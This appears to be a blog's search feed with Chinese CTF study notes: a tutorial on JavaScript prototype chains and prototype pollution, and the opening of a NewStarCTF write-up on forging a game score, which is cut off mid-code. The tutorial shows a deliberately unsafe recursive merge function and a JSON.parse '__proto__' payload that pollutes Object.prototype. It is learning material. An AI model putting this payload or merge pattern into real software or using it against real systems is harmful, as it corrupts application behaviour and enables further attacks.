<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>初识JavaScript原型链污染</title>
    <link href="/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>0xGame碰到了原型链污染的题，记录一下学习过程</p><span id="more"></span><hr><p>因为第一次接触，所以先了解了<code>Javascript</code>这东西的特性，先看一段简单的构造类的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">//名为person的构造函数，构造函数用于创建拥有特定属性/方法的对象</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;rendongjun&quot;</span>;<span class="hljs-comment">//name属性</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">test</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-comment">//test方法，返回 333</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">333</span>;<br><br>&#125;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">a</span>=<span class="hljs-number">3</span>;<span class="hljs-comment">//通过原型继承的方式，给Person构造函数的原型对象添加了一个名为a的属性，其值为3</span><br>web=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//创建名为web的对象，该对象是通过person构造函数创建的一个实例，构造函数使用new调用</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-title function_">test</span>());<span class="hljs-comment">//使用console函数进行打印</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-property">a</span>)<br></code></pre></td></tr></table></figure><h6 id="什么是原型继承？"><a href="#什么是原型继承？" class="headerlink" title="什么是原型继承？"></a>什么是原型继承？</h6><p>每个JavaScript对象都有一个原型对象，它是一个普通的对象，包含了一些共享的属性和方法。当我们创建一个新对象时，它会自动继承原型对象的属性和方法。</p><p>在JavaScript中，我们可以通过修改原型对象来实现属性和方法的继承。</p><p><code>Person.prototype.a = 3</code>这段代码就是在<code>Person</code>构造函数的原型对象上添加了一个名为<code>a</code>的属性，其值为3。这意味着通过<code>Person</code>构造函数创建的所有对象实例都会继承这个<code>a</code>属性，并且可以通过对象实例访问和使用它。</p><p>换句话说，当我们创建一个<code>person</code>对象实例，比如<code>web = new person()</code>，这个实例会继承<code>person</code>构造函数的原型对象上的属性和方法。因此，<code>web</code>对象可以访问和使用<code>a</code>属性，即<code>web.a</code>会返回3。</p><p><code>__proto__</code>属性指向它的构造函数的<code>prototype</code>属性。</p><h6 id="什么是原型链？"><a href="#什么是原型链？" class="headerlink" title="什么是原型链？"></a>什么是原型链？</h6><p>原型链是JavaScript中一种对象之间的关系模型，它用于实现对象的继承和属性查找。</p><p>在JavaScript中，每个对象都有一个原型对象（prototype），原型对象也是一个对象，它包含了一些共享的属性和方法。当我们访问一个对象的属性或方法时，如果该对象本身没有这个属性或方法，JavaScript会沿着原型链向上查找，直到找到该属性或方法或者到达原型链的顶端（即Object.prototype）。</p><p>原型链的关系可以通过对象的<code>__proto__</code>属性来表示。每个对象都有一个<code>__proto__</code>属性，它指向该对象的原型对象。原型对象也有自己的原型对象，这样就形成了一个链式结构，即原型链。</p><p><img src="/img/pol1.png" alt="pol1"></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个实例对象都有一个 <code>constructor</code> 属性指向对应的<strong>构造函数</strong>，即类。所以以下几种写法其实是相等的，都返回 <code>Foo</code> 类的原型对象。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">Foo</span>.proto<span class="hljs-keyword">type</span><br><span class="hljs-title">foo</span>[<span class="hljs-string">&quot;__proto__&quot;</span>]<br><span class="hljs-title">foo</span>.__proto__<br><span class="hljs-title">foo</span>.constructor.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>大段大段的文字总是让人头疼，写个简单代码体会一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>)&#123;&#125;;<br><span class="hljs-literal">undefined</span><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>();<br><span class="hljs-literal">undefined</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> == foo.<span class="hljs-property">__proto__</span> <span class="hljs-comment">//foo对象的__proto__属性等于Foo.prototype</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/nodejs1.png" alt="nodejs1"></p><p>以及</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br>son.<span class="hljs-property">__proto__</span>[<span class="hljs-string">&#x27;add_name&#x27;</span>] = <span class="hljs-string">&#x27;abc&#x27;</span><br><span class="hljs-keyword">let</span> son1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son1 Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-comment">//结果： son Name: abc</span><br><span class="hljs-comment">//son1 Name: abc</span><br></code></pre></td></tr></table></figure><p>我们明明只修改了<code>son</code>对象的<code>__proto__</code>属性，但由于有其它对象的原型属性指向了相同的原型属性(即<code>son1.__proto__</code>与其相同)，导致另外一个具有相同原型的对象也受到了影响。</p><p>再看一段<code>js</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br> <br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// 修改foo的原型（即Object），foo是一个Object类的实例，实际上是修改了Object类，给其增加了一个属性bar,值为2</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br> <br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象，他会有一个bar属性</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br> <br><span class="hljs-comment">// 查看zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br><span class="hljs-comment">//最后，虽然zoo是一个空对象&#123;&#125;，但zoo.bar的结果居然是2：</span><br><span class="hljs-comment">//参考：https://blog.csdn.net/qq_51586883/article/details/119867720</span><br></code></pre></td></tr></table></figure><p>再通过一段代码加深加深印象 :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;D&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;A&#x27;</span><br>&#125;<br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;D&#x27;, last_name: &#x27;K&#x27; &#125;</span><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;A&#x27; &#125;</span><br>son.<span class="hljs-property">last_name</span> <span class="hljs-comment">// &#x27;K&#x27;</span><br><span class="hljs-comment">//注意，此时Son.prototype=son.__proto__</span><br><br>son.<span class="hljs-property">__proto__</span>  <span class="hljs-comment">//Foo &#123; first_name: &#x27;Donald&#x27;, last_name: &#x27;Trump&#x27; &#125;</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">add_name</span>=<span class="hljs-string">&#x27;viper&#x27;</span><br>son.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined，构造函数的属性和方法要通过创建实例才能访问</span><br><span class="hljs-title class_">Foo</span> <span class="hljs-comment">//[Function: Foo] &#123; add_name: &#x27;viper&#x27; &#125;,注意这里解释了为啥Son/son.add_name没定义</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-string">&#x27;add_name&#x27;</span>]=<span class="hljs-string">&#x27;notbad&#x27;</span><span class="hljs-comment">//注意这里</span><br>son.<span class="hljs-property">add_name</span><span class="hljs-comment">//&#x27;notbad&#x27;</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span><span class="hljs-comment">//undefined，同上</span><br><br><span class="hljs-title class_">JavaScript</span> 的查找机制如下：<br><br>在对象son中寻找last_name<br>如果找不到，则在son.<span class="hljs-property">__proto__</span>中寻找last_name<br>如果仍然找不到，则继续在son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>中寻找last_name<br>依次寻找，直到找到<span class="hljs-literal">null</span>结束。比如，<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> 的 __proto__就是 <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p><p>总结一下：</p><p>1.构造函数.prototype指向的是一个对象(原型)。</p><p>2.任何对象都有一个原型对象，这个原型对象由对象的内置属性__proto__指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的。</p><p>3.只有构造函数内才有ptorotype属性。</p><p>4.每个对象都内含有一个属性：<strong>proto</strong>,也就是说就算对象里面没有对这个属性进行赋值，那么也是有这个属性的。</p><p>5.原型链的核心就是依赖对象__proto__的指向，当访问的属性在该对象不存在时，就会向上从该对象构造函数的prototype的进行查找，直至查找到Object时，就没有指向了。如果最终查找失败会返回undefined或报错。</p><p>通过一段<code>java</code>代码对比两者的异同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Test;<span class="hljs-comment">//包名为Test的类</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<span class="hljs-comment">//公共字符串属性name</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<span class="hljs-comment">//Son类继承自Father类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Son</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">super</span>.name = <span class="hljs-string">&quot;father&quot;</span>;<span class="hljs-comment">//super 关键字用于在子类中访问父类的成员变量、方法和构造函数。</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">alert</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//alert方法，返回类型为void(不会返回任何值)</span><br>        System.out.println(<span class="hljs-string">&quot;i am son&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s1.name);<span class="hljs-comment">//System.out是一个标准输出流对象，println()是一个方法，用于将指定的参数打印到控制台，并在末尾添加一个换行符。</span><br>        s1.name = <span class="hljs-string">&quot;son&quot;</span>;<br>        System.out.println(s1.name);<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s2.name);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//结果：</span><br>father<br>son<br>father<br></code></pre></td></tr></table></figure><p><code>java是基于对象继承，javascript是基于原型继承</code></p><h4 id="污染原理"><a href="#污染原理" class="headerlink" title="污染原理"></a>污染原理</h4><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p><p>简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象</p><h4 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h4><p>现在我们大致可以知道：如果可以通过某种方法控制<code>对象.__proto__</code>的值，那我们就可以间接修改继承该原型对象的所有对象。</p><p>1.<strong>对象merge</strong> <strong>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</strong> 以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//用于将一个源对象的属性合并到目标对象中</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//遍历source的所有属性</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//对于每个属性，若同时存在于源对象和目标对象中</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//表示这是一个嵌套对象，需要递归调用merge函数，将源对象的嵌套属性合并到目标对象的对应嵌套属性中。</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//非嵌套属性，直接将源对象的属性值赋给目标对象的对应属性。</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里如果我们让key是<code>__proto__</code>的话那么是不是就可以对原型造成影响，最终影响到实例化出来的类呢？</strong></p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1)<span class="hljs-comment">//&#123; a: 1, b: 2 &#125;,proto没有被当做键名</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br><span class="hljs-comment">//结果：1 2  undefined</span><br></code></pre></td></tr></table></figure><p>为什么<code>o1</code>被污染了而<code>o3</code>没有被污染?</p><p>打开node看下<code>o2</code>的<code>key</code>：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">Welcome to Node.js v18.18.0.<br>Type &quot;.help&quot; for more information.<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;&#125;</span><br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> o2)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key);&#125;</span><br>a<br>b<br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2</span><br>&#123; a: 1 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span></span><br>&#123; b: 2 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>[Object: null prototype] &#123;&#125;  //最上层的object，并没有任何属性<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>null<br>&gt;可以看到o2的key只有a,b没有我们需要的__proto__，并注意最后几行！<br></code></pre></td></tr></table></figure><p>原因很好理解：在<code>o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</code>中，<code>&quot;__proto__&quot;:&#123;b:2&#125;</code>等价于<code>o2.__proto__=&#123;b:2&#125;</code>，也就是<code>o2</code>这个实例的<code>__proto__</code>属性。<code>__proto__</code>并没被当成键名解析。</p><p>我们需要这样修改(<code>利用JSON.parse</code>)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parse的存在可以将JSON字符串解析为JavaScript对象，这样一来就存在o2.__protp__.b=2,并把这东西赋值给之前不存在的o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>简单分析下运行过程：</p><p>首先是<code>o1[a]=02[a]=1</code>，然后进行<code>o1.__proto__</code>和<code>o2.__proto__</code>(注意这是共有的，所以进行循环<code>merge</code>过程)，即<code>o1.__proto__.b=o2.__proto__.b=2</code>，即<code>Object.prototype.b=2</code>。</p><p>也就是最顶层的<code>Object.prototype</code>所指向的对象添加了属性,所以我们随便创建一个对象也就有了b这个属性(间接拥有，会向上查一个<code>.proto__</code>)。</p><p>参考文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>jlkl.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">11</span><span class="hljs-regexp">/06/</span>Web_16/<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51586883/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">119867720</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7182</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week2</title>
    <link href="/2023/10/12/NewStarCTF_Week2/"/>
    <url>/2023/10/12/NewStarCTF_Week2/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第二周，菜鸟的wp</p><span id="more"></span><hr><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>听说你是游戏高手？</p><p>进环境发现是个小游戏，分数到达<code>100000</code>才能拿<code>flag</code>:</p><p><img src="/img/youxi1.png" alt="youxi1"></p><p>目测是要通过<code>burpsuite</code>伪造分数数据包，右键源码没啥东西，<code>F12</code>打开调试器，发现<code>app_v2.js</code>：</p><p>在游戏进行的过程中并不存在数据包传递，除非游戏结束时分数<code>&gt;100000</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//游戏结束</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); <span class="hljs-comment">//创建XMLHttpRequest的对象xhr，与服务器通信</span><br>        